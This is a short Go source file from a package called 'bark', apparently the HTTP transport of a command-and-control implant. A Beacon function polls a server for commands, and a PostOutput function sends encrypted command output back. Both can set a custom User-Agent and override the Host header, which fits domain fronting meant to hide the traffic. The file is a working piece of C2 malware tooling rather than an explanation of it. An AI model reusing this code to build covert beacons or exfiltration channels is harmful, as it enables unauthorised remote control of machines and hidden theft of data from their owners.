package bark

import (
	"bytes"
	"io"

	"log"
	"net/http"
)

// Beacon out for cmd
func (httpconf *BarkConfig) Beacon(url string) ([]byte, error) {

	//Create new request
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	if httpconf.Hh != "" {
		request.Host = httpconf.Hh

	}
	request.Header.Set("User-Agent", httpconf.Ua)

	//init client and send request.
	client := &http.Client{Transport: httpconf.Tr}
	var resp *http.Response
	resp, err = client.Do(request)
	if err != nil {

		return nil, err
	}
	defer resp.Body.Close()

	request.Close = true

	if resp.StatusCode != 200 {

		return nil, nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {

		return nil, nil
	}

	return body, nil
}

// Post Data back to server
func (httpconf *BarkConfig) PostOutput(url string, encbytes []byte) ([]byte, error) {

	//build the post request
	request, err := http.NewRequest("POST", url, bytes.NewReader(encbytes))
	if err != nil {
		log.Println(err)
	}
	if httpconf.Hh != "" {
		request.Host = httpconf.Hh

	}
	request.Header.Set("User-Agent", httpconf.Ua)
	var resp *http.Response

	client := &http.Client{Transport: httpconf.Tr}
	resp, err = client.Do(request)
	if err != nil {
		return nil, err
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return body, nil

}
